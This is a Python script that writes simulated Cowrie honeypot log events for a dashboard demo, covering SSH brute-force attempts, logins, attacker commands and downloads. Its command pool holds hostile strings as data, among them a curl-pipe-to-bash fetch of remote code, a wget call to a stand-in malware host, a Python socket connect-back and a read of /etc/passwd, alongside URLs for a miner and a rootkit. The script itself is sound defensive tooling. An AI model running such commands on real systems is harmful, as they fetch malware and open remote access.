"""
Mock Cowrie log generator for HoneyDash demo/testing.

Writes realistic Cowrie JSON events to a log file at a configurable rate.
Set EVENTS_PER_SECOND env var (default 0.5 = one event every 2 seconds).
Set LOG_PATH env var to target log file (default /var/log/cowrie/cowrie.json).
"""

import json
import os
import random
import time
import uuid
from datetime import datetime, timezone

_DEFAULT_LOG_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "backend", "cowrie.json"
)
LOG_PATH = os.environ.get("LOG_PATH", _DEFAULT_LOG_PATH)
EVENTS_PER_SECOND = float(os.environ.get("EVENTS_PER_SECOND", "0.5"))
SLEEP = 1.0 / EVENTS_PER_SECOND
# Gentle demo pacing: ~1 event every MIN_EVENT_DELAY–MAX_EVENT_DELAY seconds
MIN_DELAY = float(os.environ.get("MIN_EVENT_DELAY", "10"))
MAX_DELAY = float(os.environ.get("MAX_EVENT_DELAY", "20"))

# Pools of realistic attacker data
ATTACKER_IPS = [
    "185.142.53.12", "91.234.56.78", "45.155.205.100", "194.165.16.98",
    "5.188.206.21",  "193.32.162.50", "62.233.50.250", "176.97.210.60",
    "195.88.208.33", "109.237.99.25", "37.49.230.154", "200.76.24.31",
    "103.88.235.46", "122.195.200.148", "116.31.116.52", "80.66.88.207",
    "45.227.255.200", "159.203.176.193", "64.227.41.12", "134.122.91.14",
]

USERNAMES = [
    "root", "admin", "ubuntu", "pi", "user", "oracle", "postgres",
    "deploy", "git", "www-data", "test", "guest", "support", "ftp",
]

PASSWORDS = [
    "123456", "password", "admin", "root", "12345", "admin123",
    "pass", "1234", "qwerty", "letmein", "welcome", "monkey",
    "abc123", "iloveyou", "sunshine", "master", "dragon",
]

COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "id",
    "whoami",
    "ls -la /",
    "wget http://malware-test.example.com/payload.sh -O /tmp/payload.sh",
    "curl -s http://45.155.205.100/bot.sh | bash",
    "chmod +x /tmp/payload.sh && /tmp/payload.sh",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1.2.3.4\",4444))'",
    "cat /proc/cpuinfo | grep MHz",
    "free -m",
    "netstat -tlnp",
    "ps aux",
    "crontab -l",
    "/bin/bash -i",
]

DOWNLOAD_URLS = [
    "http://45.155.205.100/miner.sh",
    "http://185.142.53.12/bot",
    "http://194.165.16.98/payload.elf",
    "http://5.188.206.21/rootkit.tar.gz",
]


def ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"


def write_event(data: dict):
    parent = os.path.dirname(os.path.abspath(LOG_PATH))
    os.makedirs(parent, exist_ok=True)
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(json.dumps(data) + "\n")
        f.flush()


class Session:
    def __init__(self):
        self.id = uuid.uuid4().hex[:16]
        self.ip = random.choice(ATTACKER_IPS)
        self.src_port = random.randint(30000, 65535)
        self.started = False
        self.login_attempts = 0
        self.logged_in = False
        self.phase = "connect"  # connect → brute → [login_ok] → [commands] → close

    def next_event(self) -> dict | None:
        if self.phase == "connect":
            self.phase = "brute"
            return {
                "eventid": "cowrie.session.connect",
                "src_ip": self.ip,
                "src_port": self.src_port,
                "dst_ip": "10.0.0.1",
                "dst_port": 22,
                "session": self.id,
                "timestamp": ts(),
                "sensor": "cowrie-01",
            }

        if self.phase == "brute":
            if self.login_attempts < random.randint(3, 20):
                self.login_attempts += 1
                return {
                    "eventid": "cowrie.login.failed",
                    "username": random.choice(USERNAMES),
                    "password": random.choice(PASSWORDS),
                    "src_ip": self.ip,
                    "src_port": self.src_port,
                    "session": self.id,
                    "timestamp": ts(),
                    "sensor": "cowrie-01",
                }
            # Random chance of success
            if random.random() < 0.15:
                self.phase = "commands"
                return {
                    "eventid": "cowrie.login.success",
                    "username": random.choice(USERNAMES),
                    "password": random.choice(PASSWORDS),
                    "src_ip": self.ip,
                    "src_port": self.src_port,
                    "session": self.id,
                    "timestamp": ts(),
                    "sensor": "cowrie-01",
                }
            self.phase = "close"
            return None  # skip to close

        if self.phase == "commands":
            if random.random() < 0.7:
                # Run a command
                cmd = random.choice(COMMANDS)
                event = {
                    "eventid": "cowrie.command.input",
                    "input": cmd,
                    "src_ip": self.ip,
                    "src_port": self.src_port,
                    "session": self.id,
                    "timestamp": ts(),
                    "sensor": "cowrie-01",
                }
                if random.random() < 0.3:
                    # Also attempt file download
                    self.phase = "download"
                return event
            self.phase = "close"
            return None

        if self.phase == "download":
            self.phase = "close"
            return {
                "eventid": "cowrie.session.file_download",
                "url": random.choice(DOWNLOAD_URLS),
                "outfile": f"/tmp/{uuid.uuid4().hex[:8]}",
                "src_ip": self.ip,
                "src_port": self.src_port,
                "session": self.id,
                "timestamp": ts(),
                "sensor": "cowrie-01",
            }

        if self.phase == "close":
            self.phase = "done"
            return {
                "eventid": "cowrie.session.closed",
                "duration": round(random.uniform(2.0, 180.0), 2),
                "src_ip": self.ip,
                "src_port": self.src_port,
                "session": self.id,
                "timestamp": ts(),
                "sensor": "cowrie-01",
            }

        return None  # phase == "done"


def main():
    print(f"[mock-cowrie] Writing to {LOG_PATH} — ~1 event every {MIN_DELAY:.0f}-{MAX_DELAY:.0f}s")
    session = Session()

    while True:
        # Emit exactly ONE real event per cycle. Skip internal None transitions,
        # and roll a fresh attacker session once the current one finishes.
        event = session.next_event()
        guard = 0
        while event is None and guard < 8:
            guard += 1
            if session.phase == "done":
                session = Session()
            event = session.next_event()

        if event:
            write_event(event)
            print(f"  {event['eventid']} from {event['src_ip']}")

        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))


if __name__ == "__main__":
    main()
